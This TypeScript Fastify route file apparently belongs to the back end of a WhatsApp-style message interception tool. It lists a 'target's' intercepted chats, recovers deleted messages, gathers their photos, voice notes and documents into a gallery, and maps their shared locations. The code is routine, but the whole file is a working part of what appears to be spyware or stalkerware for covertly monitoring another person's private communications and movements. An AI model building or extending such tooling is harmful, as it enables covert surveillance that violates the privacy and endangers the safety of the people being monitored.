import type { FastifyInstance } from 'fastify';
import { authenticate } from '../middleware/auth.js';

export async function messageRoutes(fastify: FastifyInstance) {
  // All routes require authentication
  fastify.addHook('onRequest', authenticate);

  /**
   * GET /api/messages/:targetId
   * Get intercepted messages for a target, paginated.
   */
  fastify.get<{
    Params: { targetId: string };
    Querystring: {
      page?: string;
      limit?: string;
      type?: string;
      chatJid?: string;
      from?: string;
      to?: string;
      search?: string;
    };
  }>('/:targetId', async (request, reply) => {
    const { targetId } = request.params;
    const page = parseInt(request.query.page || '1');
    const limit = Math.min(parseInt(request.query.limit || '50'), 100);
    const skip = (page - 1) * limit;
    const { type, chatJid, from, to, search } = request.query;

    const { prisma } = fastify.appContext;

    // Build filter
    const where: any = { targetId };
    if (type) where.type = type;
    if (chatJid) where.chatJid = { contains: chatJid };
    if (from) where.timestamp = { ...where.timestamp, gte: new Date(from) };
    if (to) where.timestamp = { ...where.timestamp, lte: new Date(to) };
    if (search) where.content = { contains: search, mode: 'insensitive' };

    const [messages, total] = await Promise.all([
      prisma.interceptedMessage.findMany({
        where,
        include: {
          media: true,
          location: true,
        },
        orderBy: { timestamp: 'desc' },
        skip,
        take: limit,
      }),
      prisma.interceptedMessage.count({ where }),
    ]);

    return {
      messages,
      pagination: {
        page,
        limit,
        total,
        pages: Math.ceil(total / limit),
      },
    };
  });

  /**
   * GET /api/messages/:targetId/conversations
   * Get list of unique conversations (chat JIDs) for a target.
   */
  fastify.get<{
    Params: { targetId: string };
  }>('/:targetId/conversations', async (request) => {
    const { targetId } = request.params;
    const { prisma } = fastify.appContext;

    const conversations = await prisma.interceptedMessage.groupBy({
      by: ['chatJid'],
      where: { targetId },
      _count: { id: true },
      _max: { timestamp: true },
      orderBy: { _max: { timestamp: 'desc' } },
    });

    // Get the latest message for each conversation
    const enriched = await Promise.all(
      conversations.map(async (conv) => {
        const lastMessage = await prisma.interceptedMessage.findFirst({
          where: { targetId, chatJid: conv.chatJid },
          orderBy: { timestamp: 'desc' },
          select: { content: true, type: true, timestamp: true, direction: true },
        });
        return {
          chatJid: conv.chatJid,
          messageCount: conv._count.id,
          lastMessageAt: conv._max.timestamp,
          lastMessage,
        };
      }),
    );

    return { conversations: enriched };
  });

  /**
   * GET /api/messages/:targetId/stats
   * Get message statistics for a target.
   */
  fastify.get<{
    Params: { targetId: string };
  }>('/:targetId/stats', async (request) => {
    const { targetId } = request.params;
    const { prisma } = fastify.appContext;

    const [
      totalMessages,
      byType,
      byDirection,
      deletedCount,
      todayCount,
    ] = await Promise.all([
      prisma.interceptedMessage.count({ where: { targetId } }),
      prisma.interceptedMessage.groupBy({
        by: ['type'],
        where: { targetId },
        _count: { id: true },
      }),
      prisma.interceptedMessage.groupBy({
        by: ['direction'],
        where: { targetId },
        _count: { id: true },
      }),
      prisma.interceptedMessage.count({ where: { targetId, isDeleted: true } }),
      prisma.interceptedMessage.count({
        where: {
          targetId,
          timestamp: { gte: new Date(new Date().setHours(0, 0, 0, 0)) },
        },
      }),
    ]);

    const typeBreakdown: Record<string, number> = {};
    for (const t of byType) {
      typeBreakdown[t.type] = t._count.id;
    }

    const directionBreakdown: Record<string, number> = {};
    for (const d of byDirection) {
      directionBreakdown[d.direction] = d._count.id;
    }

    return {
      total: totalMessages,
      today: todayCount,
      deleted: deletedCount,
      byType: typeBreakdown,
      byDirection: directionBreakdown,
    };
  });

  /**
   * GET /api/messages/:targetId/deleted
   * Get deleted messages for a target.
   */
  fastify.get<{
    Params: { targetId: string };
    Querystring: { page?: string; limit?: string };
  }>('/:targetId/deleted', async (request) => {
    const { targetId } = request.params;
    const page = parseInt(request.query.page || '1');
    const limit = Math.min(parseInt(request.query.limit || '50'), 100);
    const skip = (page - 1) * limit;

    const { prisma } = fastify.appContext;

    const [messages, total] = await Promise.all([
      prisma.interceptedMessage.findMany({
        where: { targetId, isDeleted: true },
        include: { media: true, location: true },
        orderBy: { deletedAt: 'desc' },
        skip,
        take: limit,
      }),
      prisma.interceptedMessage.count({ where: { targetId, isDeleted: true } }),
    ]);

    return {
      messages,
      pagination: { page, limit, total, pages: Math.ceil(total / limit) },
    };
  });

  /**
   * GET /api/messages/:targetId/media
   * Get media files for a target (gallery view).
   */
  fastify.get<{
    Params: { targetId: string };
    Querystring: { page?: string; limit?: string; type?: string };
  }>('/:targetId/media', async (request) => {
    const { targetId } = request.params;
    const page = parseInt(request.query.page || '1');
    const limit = Math.min(parseInt(request.query.limit || '30'), 100);
    const skip = (page - 1) * limit;
    const { type } = request.query;

    const { prisma } = fastify.appContext;

    const typeFilter = type
      ? [type]
      : ['IMAGE', 'VIDEO', 'AUDIO', 'VOICE_NOTE', 'DOCUMENT', 'STICKER'];

    const [messages, total] = await Promise.all([
      prisma.interceptedMessage.findMany({
        where: { targetId, type: { in: typeFilter as any[] } },
        include: { media: true },
        orderBy: { timestamp: 'desc' },
        skip,
        take: limit,
      }),
      prisma.interceptedMessage.count({
        where: { targetId, type: { in: typeFilter as any[] } },
      }),
    ]);

    return {
      media: messages,
      pagination: { page, limit, total, pages: Math.ceil(total / limit) },
    };
  });

  /**
   * GET /api/messages/:targetId/locations
   * Get location messages for a target (map view).
   */
  fastify.get<{
    Params: { targetId: string };
  }>('/:targetId/locations', async (request) => {
    const { targetId } = request.params;
    const { prisma } = fastify.appContext;

    const locations = await prisma.locationData.findMany({
      where: { message: { targetId } },
      include: {
        message: {
          select: {
            senderJid: true,
            direction: true,
            timestamp: true,
            content: true,
          },
        },
      },
      orderBy: { createdAt: 'desc' },
      take: 100,
    });

    return { locations };
  });
}
